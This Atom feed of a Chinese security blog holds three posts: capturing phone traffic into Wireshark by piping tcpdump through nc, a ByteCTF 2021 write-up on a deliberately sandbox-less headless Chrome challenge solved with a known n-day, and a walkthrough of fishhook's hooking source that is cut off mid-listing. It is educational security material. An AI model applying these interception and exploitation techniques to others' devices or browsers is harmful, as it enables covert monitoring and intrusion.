<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>o0xmuhe&#39;s blog</title>
  
  <subtitle>0x414243444546 ????</subtitle>
  <link href="http://o0xmuhe.me/atom.xml" rel="self"/>
  
  <link href="http://o0xmuhe.me/"/>
  <updated>2021-12-15T09:03:41.061Z</updated>
  <id>http://o0xmuhe.me/</id>
  
  <author>
    <name>muhe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>将Android/iOS上的流量转发到Wireshark分析</title>
    <link href="http://o0xmuhe.me/2021/12/15/%E5%B0%86Android-iOS%E4%B8%8A%E7%9A%84%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91%E5%88%B0Wireshark%E5%88%86%E6%9E%90/"/>
    <id>http://o0xmuhe.me/2021/12/15/%E5%B0%86Android-iOS%E4%B8%8A%E7%9A%84%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91%E5%88%B0Wireshark%E5%88%86%E6%9E%90/</id>
    <published>2021-12-15T08:50:53.000Z</published>
    <updated>2021-12-15T09:03:41.061Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景-amp-amp-需求"><a href="#背景-amp-amp-需求" class="headerlink" title="背景&amp;&amp;需求"></a>背景&amp;&amp;需求</h2><p>  迫于要分析一些SDK里的协议，需要抓到所有的流量来分析交互过程，所以有了这篇记录，主要是基于<a href="https://blog.csdn.net/HorkyChen/article/details/11822657?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163955839616780265452906%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=163955839616780265452906&biz_id=0&spm=1018.2226.3001.4187">实时监控Android设备网络封包</a>做的尝试，然后使用相同的思路扩展到了iOS上。</p><span id="more"></span><p>原理图：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcpdump---nc---端口转发---nc----wireshark</span><br><span class="line">|------手机------||-------PC端-------|</span><br></pre></td></tr></table></figure><h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><blockquote><p>手机必须root</p></blockquote><ul><li>adb</li><li>tcpdump</li><li>nc </li></ul><p>手机端:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -l -n -s 0 -v -w - | nc -l -p  11233</span><br></pre></td></tr></table></figure><p>PC端:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:11233 tcp:11233 &amp;&amp; nc 127.0.0.1 11233 | wireshark -k -S -i -</span><br></pre></td></tr></table></figure><h2 id="iOS"><a href="#iOS" class="headerlink" title="iOS"></a>iOS</h2><blockquote><p>手机必须越狱</p></blockquote><ul><li>nc</li><li>tcpdump</li><li>iproxy(<a href="https://libimobiledevice.org/">libimobiledevice</a>)</li></ul><p>手机端:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -l -n -s 0 -v -w - | nc -l -p 11233</span><br></pre></td></tr></table></figure><p>PC端:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~  iproxy 11233 11233</span><br><span class="line">Creating listening port 11233 <span class="keyword">for</span> device port 11233</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~  nc 127.0.0.1 11233 | wireshark -k -S -i -</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/HorkyChen/article/details/11822657?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163955839616780265452906%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=163955839616780265452906&biz_id=0&spm=1018.2226.3001.4187">实时监控Android设备网络封包</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;背景-amp-amp-需求&quot;&gt;&lt;a href=&quot;#背景-amp-amp-需求&quot; class=&quot;headerlink&quot; title=&quot;背景&amp;amp;&amp;amp;需求&quot;&gt;&lt;/a&gt;背景&amp;amp;&amp;amp;需求&lt;/h2&gt;&lt;p&gt;  迫于要分析一些SDK里的协议，需要抓到所有的流量来分析交互过程，所以有了这篇记录，主要是基于&lt;a href=&quot;https://blog.csdn.net/HorkyChen/article/details/11822657?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163955839616780265452906%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=163955839616780265452906&amp;biz_id=0&amp;spm=1018.2226.3001.4187&quot;&gt;实时监控Android设备网络封包&lt;/a&gt;做的尝试，然后使用相同的思路扩展到了iOS上。&lt;/p&gt;</summary>
    
    
    
    
    <category term="iOS" scheme="http://o0xmuhe.me/tags/iOS/"/>
    
    <category term="Android" scheme="http://o0xmuhe.me/tags/Android/"/>
    
    <category term="流量分析" scheme="http://o0xmuhe.me/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
    <category term="Wireshark" scheme="http://o0xmuhe.me/tags/Wireshark/"/>
    
  </entry>
  
  <entry>
    <title>ByteCTF2021 chatroom writeup</title>
    <link href="http://o0xmuhe.me/2021/10/17/ByteCTF2021-chatroom-writeup/"/>
    <id>http://o0xmuhe.me/2021/10/17/ByteCTF2021-chatroom-writeup/</id>
    <published>2021-10-17T10:10:17.000Z</published>
    <updated>2021-10-18T13:09:35.058Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>  在今年的ByteCTF中，我出了一道pwn题目，距离上一次打比赛/出题已经过去很久了，所以传统的 <code>heap trick</code> 就没有考虑，而是从我日常工作中挖掘的安全风险入手，简化场景，出了一道 <code>chatroom</code> ，看起来像一个web的奇怪题目。</p> <span id="more"></span><p>  这个题目其实背后是 <code>Headless Chrome</code> 相关的pwn，我早期的一篇博客其实已经阐述过相关风险，可以参考 <a href="https://o0xmuhe.github.io/2021/05/26/Chrome-headless-exploit/">Exploit Headless Chrome</a>。 其实这个风险暴露出来的不仅仅是：低版本、误用参数 这两个显而易见的问题，其背后的原因是一些不好的编程习惯被错误地传播：大家都在用 <code>--no-sandbox</code> 参数，好像 <code>it works</code>就够了，但是在实际场景中，这是很危险的。</p><h2 id="题目设计思路"><a href="#题目设计思路" class="headerlink" title="题目设计思路"></a>题目设计思路</h2><p>  我的本意是设计一个类似聊天室的场景，用户可以在聊天室内发送消息、多媒体文件、链接等，尽可能模拟一个真实场景。 处于风控考虑，对于非白名单的链接，需要进行检查（是否恶意，色流等）。对于URL 检查的逻辑，最好是服务端接收到内容之后，判断是否是URL，随后通过RPC调用走到URL检查的服务去。但是考虑到实际题目，我大大简化了这个场景，直接把检查放在前端了，而且我没有混淆JS，所以可以很直接看到一个HTTP请求。</p><p>  解决了场景问题，聊天室部分直接用了github的开源项目 <a href="https://github.com/cleverqin/node-websocket-Chatroom">node-websocket-Chatroom</a>，后端使用 puppeteer来抓取用户的URL。</p><p>为了提升一些难度，同时这也是我曾经遇到过的问题：UA不可靠的情况下怎么判断Chrome版本？</p><p>所以我直接在启动参数里把UA给改了：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(&#123; </span><br><span class="line">   <span class="attr">args</span>: [<span class="string">&#x27;--no-sandbox&#x27;</span>, <span class="string">&#x27;--disable-setuid-sandbox&#x27;</span>, </span><br><span class="line">          <span class="string">&#x27;--user-agent=&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)</span></span><br><span class="line"><span class="string">           AppleWebKit/537.36 (KHTML, like Gecko) Chrome/1337.13.37.0  Safari/4141.42&quot;&#x27;</span>], </span><br><span class="line"><span class="attr">ignoreHTTPSErrors</span>: <span class="literal">true</span>, <span class="attr">dumpio</span>: <span class="literal">false</span> &#125;);</span><br></pre></td></tr></table></figure><p>最终题目成型：</p><ul><li>非最新版本puppeteer</li><li>–no-sandbox</li><li>UA不准确</li></ul><h2 id="Writeup-amp-非预期"><a href="#Writeup-amp-非预期" class="headerlink" title="Writeup &amp; 非预期"></a>Writeup &amp; 非预期</h2><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>主要是 <a href="https://twitter.com/zh1x1an2">zh1x1an2</a> 同学的做法，Exploit狂轰滥炸术，挨个挨个来，最终拿到flag。</p><h3 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h3><p>UA不可信，但是V8 和 Blink是可信的，不同Chrome版本会有不同的features，所以可以借助这个点，判断一个大版本，便于后续做利用。</p><p>参考 : <a href="https://chromestatus.com/features">https://chromestatus.com/features</a> </p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/chrome_features.png" alt="chrome_features"></p><p>不过这个需要一些积累 &amp;&amp; 测试  :)</p><p>随后判断出来版本是 M88 之后，找个合适的nday就可以打了 : )</p><h2 id="题目环境"><a href="#题目环境" class="headerlink" title="题目环境"></a>题目环境</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker pull muhe/ctf_chal_chatroom:v7</span><br><span class="line"></span><br><span class="line">docker run -dit --name chatroom1 -p 3000:3000 -p 31337:31337 muhe/ctf_chal_chatroom:v7</span><br></pre></td></tr></table></figure><p>访问 <code>http://localhost:3000</code> 就可以本地测试题目了  :)</p><h2 id="不足之处"><a href="#不足之处" class="headerlink" title="不足之处"></a>不足之处</h2><ol><li>无法防止爆破这种非预期解题方式。</li><li>使用nday似乎很无趣，但是塞进去一个洞，给一个 <code>patch.diff</code> 似乎又有点奇怪，偏离题目原本的出发点。</li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;  在今年的ByteCTF中，我出了一道pwn题目，距离上一次打比赛/出题已经过去很久了，所以传统的 &lt;code&gt;heap trick&lt;/code&gt; 就没有考虑，而是从我日常工作中挖掘的安全风险入手，简化场景，出了一道 &lt;code&gt;chatroom&lt;/code&gt; ，看起来像一个web的奇怪题目。&lt;/p&gt;</summary>
    
    
    
    
    <category term="writeup" scheme="http://o0xmuhe.me/tags/writeup/"/>
    
    <category term="pwn" scheme="http://o0xmuhe.me/tags/pwn/"/>
    
    <category term="CTF" scheme="http://o0xmuhe.me/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>iOS RE 4 beginners 3 - fishhook</title>
    <link href="http://o0xmuhe.me/2021/07/24/iOS-RE-4-beginners-3-fishhook/"/>
    <id>http://o0xmuhe.me/2021/07/24/iOS-RE-4-beginners-3-fishhook/</id>
    <published>2021-07-23T16:05:49.000Z</published>
    <updated>2021-07-23T16:19:26.859Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于"><a href="#关于" class="headerlink" title="关于"></a>关于</h1><p>Fishhook是Facebook提供的利用MachO文件惰性加载原理，通过修改懒加载和非懒加载两个表的指针达到C函数HOOK的目的一个轻量级的hook库。理解这个工具和熟悉流程也是可以帮助更好的理解MachO文件格式 :)</p><span id="more"></span><p>原理图如下：</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/fishhook.png" alt="fishhook"></p><h1 id="源码阅读"><a href="#源码阅读" class="headerlink" title="源码阅读"></a>源码阅读</h1><p>核心其实就是rebind_symbols 这个接口，另一个 <code>rebind_symbols_image</code> 是指定macho中的symbol进行rebind，所以从 <code>rebind_symbols</code>函数看起就行了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">FISHHOOK_VISIBILITY</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rebind_symbols</span><span class="params">(struct rebinding rebindings[], <span class="keyword">size_t</span> rebindings_nel)</span></span>;</span><br></pre></td></tr></table></figure><p>简单看下关键的调用路径:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rebind_symbols(struct rebinding rebindings[], <span class="keyword">size_t</span> rebindings_nel);</span><br><span class="line">        _rebind_symbols_for_image(_dyld_get_image_header(i), _dyld_get_image_vmaddr_slide(i));</span><br><span class="line">            rebind_symbols_for_image(_rebindings_head, header, slide);</span><br><span class="line">                perform_rebinding_with_section(...)</span><br></pre></td></tr></table></figure><p><code>_rebindings_head</code> 指向一个需要重绑定的符号的单项链表:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rebinding</span> &#123;</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">  <span class="keyword">void</span> *replacement;</span><br><span class="line">  <span class="keyword">void</span> **replaced;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rebindings_entry</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rebinding</span> *<span class="title">rebindings</span>;</span></span><br><span class="line">  <span class="keyword">size_t</span> rebindings_nel;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rebindings_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">rebindings_entry</span> *_<span class="title">rebindings_head</span>;</span></span><br><span class="line"><span class="keyword">segment_command_t</span> *cur_seg_cmd;</span><br><span class="line">  <span class="keyword">segment_command_t</span> *linkedit_segment = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">symtab_command</span>* <span class="title">symtab_cmd</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">dysymtab_command</span>* <span class="title">dysymtab_cmd</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uintptr_t</span> cur = (<span class="keyword">uintptr_t</span>)header + <span class="keyword">sizeof</span>(<span class="keyword">mach_header_t</span>); <span class="comment">// now, cur points to LOAD_CMDs</span></span><br><span class="line">  <span class="comment">// iter LOAD CMDs</span></span><br><span class="line">  <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; header-&gt;ncmds; i++, cur += cur_seg_cmd-&gt;cmdsize) &#123;</span><br><span class="line">    cur_seg_cmd = (<span class="keyword">segment_command_t</span> *)cur;</span><br><span class="line">    <span class="comment">// find LINK_EDIT seg</span></span><br><span class="line">    <span class="keyword">if</span> (cur_seg_cmd-&gt;cmd == LC_SEGMENT_ARCH_DEPENDENT) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cur_seg_cmd-&gt;segname, SEG_LINKEDIT) == <span class="number">0</span>) &#123;</span><br><span class="line">        linkedit_segment = cur_seg_cmd;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cur_seg_cmd-&gt;cmd == LC_SYMTAB) &#123;</span><br><span class="line">      <span class="comment">// find SYMTAB CMD</span></span><br><span class="line">      symtab_cmd = (struct symtab_command*)cur_seg_cmd;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cur_seg_cmd-&gt;cmd == LC_DYSYMTAB) &#123;</span><br><span class="line">      <span class="comment">// find DYSYM CMD</span></span><br><span class="line">      dysymtab_cmd = (struct dysymtab_command*)cur_seg_cmd;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!symtab_cmd || !dysymtab_cmd || !linkedit_segment ||</span><br><span class="line">      !dysymtab_cmd-&gt;nindirectsyms) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get indirect symbol table (array of uint32_t indices into symbol table)</span></span><br><span class="line">  <span class="keyword">uint32_t</span> *indirect_symtab = (<span class="keyword">uint32_t</span> *)(linkedit_base + dysymtab_cmd-&gt;indirectsymoff);</span><br><span class="line"></span><br><span class="line">  cur = (<span class="keyword">uintptr_t</span>)header + <span class="keyword">sizeof</span>(<span class="keyword">mach_header_t</span>);</span><br><span class="line">  <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; header-&gt;ncmds; i++, cur += cur_seg_cmd-&gt;cmdsize) &#123;</span><br><span class="line">    cur_seg_cmd = (<span class="keyword">segment_command_t</span> *)cur;</span><br><span class="line">    <span class="keyword">if</span> (cur_seg_cmd-&gt;cmd == LC_SEGMENT_ARCH_DEPENDENT) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cur_seg_cmd-&gt;segname, SEG_DATA) != <span class="number">0</span> &amp;&amp;</span><br><span class="line">          <span class="built_in">strcmp</span>(cur_seg_cmd-&gt;segname, SEG_DATA_CONST) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> (uint j = <span class="number">0</span>; j &lt; cur_seg_cmd-&gt;nsects; j++) &#123;</span><br><span class="line">        <span class="keyword">section_t</span> *sect =</span><br><span class="line">          (<span class="keyword">section_t</span> *)(cur + <span class="keyword">sizeof</span>(<span class="keyword">segment_command_t</span>)) + j;</span><br><span class="line">        <span class="keyword">if</span> ((sect-&gt;flags &amp; SECTION_TYPE) == S_LAZY_SYMBOL_POINTERS) &#123;</span><br><span class="line">          perform_rebinding_with_section(rebindings, sect, slide, symtab, strtab, indirect_symtab);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((sect-&gt;flags &amp; SECTION_TYPE) == S_NON_LAZY_SYMBOL_POINTERS) &#123;</span><br><span class="line">          perform_rebinding_with_section(rebindings, sect, slide, symtab, strtab, indirect_symtab);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">perform_rebinding_with_section</span><span class="params">(struct rebindings_entry *rebindings,</span></span></span><br><span class="line"><span class="params"><span class="function">                                           <span class="keyword">section_t</span> *section,</span></span></span><br><span class="line"><span class="params"><span class="function">                                           <span class="keyword">intptr_t</span> slide,</span></span></span><br><span class="line"><span class="params"><span class="function">                                           <span class="keyword">nlist_t</span> *symtab,</span></span></span><br><span class="line"><span class="params"><span class="function">                                           <span class="keyword">char</span> *strtab,</span></span></span><br><span class="line"><span class="params"><span class="function">                                           <span class="keyword">uint32_t</span> *indirect_symtab)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// if _DATA,CONST</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">bool</span> isDataConst = <span class="built_in">strcmp</span>(section-&gt;segname, SEG_DATA_CONST) == <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//__la_symbol_ptr的reserved1字段标识了section描述的符号在符号表中开始的index</span></span><br><span class="line">  <span class="comment">//动态符号表中第一个需要解析的符号 开始地址</span></span><br><span class="line">  <span class="keyword">uint32_t</span> *indirect_symbol_indices = indirect_symtab + section-&gt;reserved1;</span><br><span class="line">  <span class="comment">// section __la_symbol_ptr</span></span><br><span class="line">  <span class="keyword">void</span> **indirect_symbol_bindings = (<span class="keyword">void</span> **)((<span class="keyword">uintptr_t</span>)slide + section-&gt;addr);</span><br><span class="line">  <span class="keyword">vm_prot_t</span> oldProtection = VM_PROT_READ;</span><br><span class="line">  <span class="comment">// chang memory protection to write &amp;&amp; back old memery protection</span></span><br><span class="line">  <span class="keyword">if</span> (isDataConst) &#123;</span><br><span class="line">    oldProtection = get_protection(rebindings);</span><br><span class="line">    mprotect(indirect_symbol_bindings, section-&gt;size, PROT_READ | PROT_WRITE);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// Traverse section -&gt; symtab</span></span><br><span class="line">  <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; section-&gt;size / <span class="keyword">sizeof</span>(<span class="keyword">void</span> *); i++) &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> symtab_index = indirect_symbol_indices[i];</span><br><span class="line">    <span class="keyword">if</span> (symtab_index == INDIRECT_SYMBOL_ABS || symtab_index == INDIRECT_SYMBOL_LOCAL ||</span><br><span class="line">        symtab_index == (INDIRECT_SYMBOL_LOCAL   | INDIRECT_SYMBOL_ABS)) &#123;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// nlist_t</span></span><br><span class="line">    <span class="keyword">uint32_t</span> strtab_offset = symtab[symtab_index].n_un.n_strx;</span><br><span class="line">    <span class="keyword">char</span> *symbol_name = strtab + strtab_offset;</span><br><span class="line">    <span class="keyword">bool</span> symbol_name_longer_than_1 = symbol_name[<span class="number">0</span>] &amp;&amp; symbol_name[<span class="number">1</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rebindings_entry</span> *<span class="title">cur</span> =</span> rebindings;</span><br><span class="line">    <span class="keyword">while</span> (cur) &#123;</span><br><span class="line">      <span class="keyword">for</span> (uint j = <span class="number">0</span>; j &lt; cur-&gt;rebindings_nel; j++) &#123;</span><br><span class="line">        <span class="comment">// yes, it&#x27;s target symbol to rebind!</span></span><br><span class="line">        <span class="keyword">if</span> (symbol_name_longer_than_1 &amp;&amp;</span><br><span class="line">            <span class="built_in">strcmp</span>(&amp;symbol_name[<span class="number">1</span>], cur-&gt;rebindings[j].name) == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span> (cur-&gt;rebindings[j].replaced != <span class="literal">NULL</span> &amp;&amp;</span><br><span class="line">              indirect_symbol_bindings[i] != cur-&gt;rebindings[j].replacement) &#123;</span><br><span class="line">            *(cur-&gt;rebindings[j].replaced) = indirect_symbol_bindings[i]; <span class="comment">// backup old func </span></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// do rebind, hook!</span></span><br><span class="line">          **indirect_symbol_bindings[i] = cur-&gt;rebindings[j].replacement;**</span><br><span class="line">          <span class="keyword">goto</span> symbol_loop;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      cur = cur-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">  symbol_loop:;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// restore protection</span></span><br><span class="line">  <span class="keyword">if</span> (isDataConst) &#123;</span><br><span class="line">    <span class="keyword">int</span> protection = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (oldProtection &amp; VM_PROT_READ) &#123;</span><br><span class="line">      protection |= PROT_READ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (oldProtection &amp; VM_PROT_WRITE) &#123;</span><br><span class="line">      protection |= PROT_WRITE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (oldProtection &amp; VM_PROT_EXECUTE) &#123;</span><br><span class="line">      protection |= PROT_EXEC;</span><br><span class="line">    &#125;</span><br><span class="line">    mprotect(indirect_symbol_bindings, section-&gt;size, protection);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>直接拿官方的demo编译出来调试分析流程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">~/study/ios_re_link/fishhook  cat main.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;fishhook.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(*orig_close)</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(*orig_open)</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *, <span class="keyword">int</span>, ...)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_close</span><span class="params">(<span class="keyword">int</span> fd)</span> </span>&#123;</span><br><span class="line">  <span 